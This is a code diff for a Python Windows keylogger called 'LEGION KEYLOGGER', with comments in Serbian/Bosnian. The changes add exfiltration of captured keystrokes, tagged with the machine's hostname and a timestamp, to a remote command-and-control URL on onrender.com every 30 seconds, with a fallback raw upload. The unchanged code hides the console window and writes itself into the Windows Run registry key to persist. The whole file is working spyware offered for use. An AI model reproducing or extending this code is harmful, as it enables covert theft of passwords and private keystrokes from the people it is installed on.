@@ -1,33 +1,36 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import os
 import sys
 import threading
 import time
 import requests
+import socket  # ← DODAJ OVO!
+import datetime  # ← DODAJ OVO!
 from pynput import keyboard
 
 # ----- KONFIGURACIJA -----
-# 🔁 OBAVEZNO: Zameni sa URL-om tvog servera na Renderu!
-SERVER_URL = "https://legion-c2.onrender.com/keylog"  # Npr. https://keylogger-relay.onrender.com/log
+# 🔁 PROMIJENI URL NA SVOJ RENDER SERVER!
+SERVER_URL = "https://legion-c2.onrender.com/keylog"  # ← ŠALJI OVDJE!
 SEND_INTERVAL = 30  # Šalje svakih 30 sekundi
 
 log_buffer = ""
 buffer_lock = threading.Lock()
-shift_pressed = False  # Dodato za praćenje Shift tastera
+shift_pressed = False
 
 def on_press(key):
     global log_buffer, shift_pressed
 
     try:
-        # Ako je key.char dostupan (obično slovo, broj, znak)
         char = key.char
         if char is not None:
-            # Ako je Shift pritisnut, pretvori u veliko slovo (ako je slovo)
             if shift_pressed and char.isalpha():
                 char = char.upper()
             log_buffer += char
             return
     except AttributeError:
-        pass  # Nema key.char, znači specijalni taster
+        pass
 
     # Specijalni tasteri
     special = {
@@ -36,7 +39,7 @@ def on_press(key):
         keyboard.Key.tab: "\t",
         keyboard.Key.backspace: "[BACKSPACE]",
         keyboard.Key.delete: "[DELETE]",
-        keyboard.Key.shift_l: None,      # Ne dodajemo u log, samo mijenjamo stanje
+        keyboard.Key.shift_l: None,
         keyboard.Key.shift_r: None,
         keyboard.Key.ctrl_l: "[CTRL]",
         keyboard.Key.ctrl_r: "[CTRL]",
@@ -49,18 +52,10 @@ def on_press(key):
         keyboard.Key.right: "[RIGHT]",
     }
 
-    # Ažuriranje stanja Shift tastera
     if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
         shift_pressed = True
-        return  # Ne dodajemo u log
-    if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
-        # Ovo je već obrađeno, ali dodajemo i otpuštanje? Ne, ovdje je on_press.
-        # Za otpuštanje bi trebalo on_release, ali za jednostavnost,
-        # resetujemo shift_pressed tek kada se pusti Shift. Radi tačnosti,
-        # bolje je dodati i on_release. Dodajemo ispod.
-        pass
+        return
 
-    # Dodaj u log ako nije None
     rep = special.get(key)
     if rep is not None:
         log_buffer += rep
@@ -71,15 +66,39 @@ def on_release(key):
         shift_pressed = False
 
 def send_to_server(data):
-    """Šalje logove na tvoj server na Renderu"""
+    """Šalje logove na C2 server"""
+    if not data:
+        return
+        
     try:
-        response = requests.post(SERVER_URL, data=data, timeout=10)
+        # Pokušaj sa JSON formatom
+        headers = {'Content-Type': 'application/json'}
+        payload = {
+            "id": socket.gethostname(),
+            "data": data,
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        print(f"[*] Slanje {len(data)} karaktera na {SERVER_URL}...")
+        response = requests.post(SERVER_URL, json=payload, headers=headers, timeout=10)
+        
         if response.status_code == 200:
             print(f"✓ Poslato {len(data)} karaktera")
+            print(f"✓ Odgovor: {response.json()}")
         else:
             print(f"✗ Server greška: {response.status_code}")
+            print(f"✗ Odgovor: {response.text}")
+            # Pokušaj sa raw data ako JSON ne radi
+            try:
+                response = requests.post(SERVER_URL, data=data, timeout=10)
+                if response.status_code == 200:
+                    print(f"✓ Poslato {len(data)} karaktera (raw)")
+                else:
+                    print(f"✗ Server greška (raw): {response.status_code}")
+            except Exception as e2:
+                print(f"✗ Neuspješno slanje (raw): {e2}")
     except Exception as e:
-        print(f"✗ Neuspešno slanje: {e}")
+        print(f"✗ Neuspješno slanje: {e}")
 
 def periodic_sender():
     global log_buffer
@@ -97,7 +116,6 @@ def hide_console():
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def add_to_startup():
-    """Dodaje program u Windows autostart"""
     try:
         import winreg
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -113,6 +131,13 @@ if __name__ == "__main__":
     hide_console()
     add_to_startup()
     
+    print("="*50)
+    print("🐉 LEGION KEYLOGGER")
+    print("="*50)
+    print(f"[+] Server: {SERVER_URL}")
+    print(f"[+] Slanje svakih {SEND_INTERVAL} sekundi")
+    print("="*50)
+    
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.daemon = True
     listener.start()
@@ -121,8 +146,9 @@ if __name__ == "__main__":
     sender_thread = threading.Thread(target=periodic_sender, daemon=True)
     sender_thread.start()
     print(f"✓ Slanje na server svakih {SEND_INTERVAL} sekundi")
+    print(f"✓ Server: {SERVER_URL}")
+    print("Keylogger je aktivan. Počni kucati!")
     
-    print("Keylogger je aktivan.")
     try:
         while True:
             time.sleep(1)
